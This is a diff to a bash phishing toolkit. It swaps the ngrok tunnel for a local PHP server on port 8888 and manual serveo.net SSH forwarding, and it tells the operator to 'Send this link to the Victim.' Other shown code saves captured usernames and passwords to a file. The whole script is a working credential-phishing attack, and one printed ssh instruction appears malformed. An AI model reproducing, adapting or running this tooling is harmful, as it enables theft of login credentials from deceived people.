@@ -183,12 +183,12 @@ fi
 
 stop() {
 
-checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+## checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
-if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-fi
+## if [[ $checkngrok == *'ngrok'* ]]; then
+## pkill -f -2 ngrok > /dev/null 2>&1
+## killall -2 ngrok > /dev/null 2>&1
+## fi
 if [[ $checkphp == *'php'* ]]; then
 pkill -f -2 php > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
@@ -263,7 +263,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
+## killall -2 ngrok > /dev/null 2>&1
 exit 1
 
 }
@@ -380,51 +380,61 @@ rm -rf sites/$server/usernames.txt
 fi
 
 
-if [[ -e ngrok ]]; then
-echo ""
-else
+## if [[ -e ngrok ]]; then
+## echo ""
+## else
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+## printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
+## arch=$(uname -a | grep -o 'arm' | head -n1)
+## arch2=$(uname -a | grep -o 'Android' | head -n1)
+## if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+## wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
-else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
-fi
+## if [[ -e ngrok-stable-linux-arm.zip ]]; then
+## unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+## chmod +x ngrok
+## rm -rf ngrok-stable-linux-arm.zip
+## else
+## printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+## exit 1
+## fi
 
 
 
-else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-fi
-fi
+##else
+##wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+##if [[ -e ngrok-stable-linux-386.zip ]]; then
+##unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+##chmod +x ngrok
+##rm -rf ngrok-stable-linux-386.zip
+##else
+##printf "\e[1;93m[!] Download error... \e[0m\n"
+##exit 1
+##fi
+##fi
+##fi
 
+## default_ip=$(hostname -I)
+## printf "\e[1;92m[\e[0m*\e[1;92m] Put your local IP (Default %s): " $default_ip
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+cd  sites/$server && php -S 127.0.0.1:8888 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
-
-link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim (please add port: 8888):\e[0m\e[1;77m %s\e[0m\n" $(hostname -I)
+printf "\e[1;92m[\e[0m*\e[1;92m] Please open another terminal window and run 'ssh 80:127.0.0.1:8888 serveo.net' manualy and give victim that url.\e[0m\e[1;77m %s\e[0m\n"
 checkfound
 }
+
+## printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+## cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+## sleep 2
+##printf "\e[1;92m[\e[0m*\e[1;92m] Starting serveo server...\n"
+## ssh -R 80:127.0.0.1:3333 serveo.net  > /dev/null 2>&1 &
+## sleep 10
+
+## link=$(ssh -R 80:127.0.0.1:3333 serveo.net | grep -o "https://[0-9a-z]*\.serveo.net")
+## printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
+## checkfound
+## }
 checkfound() {
 
 
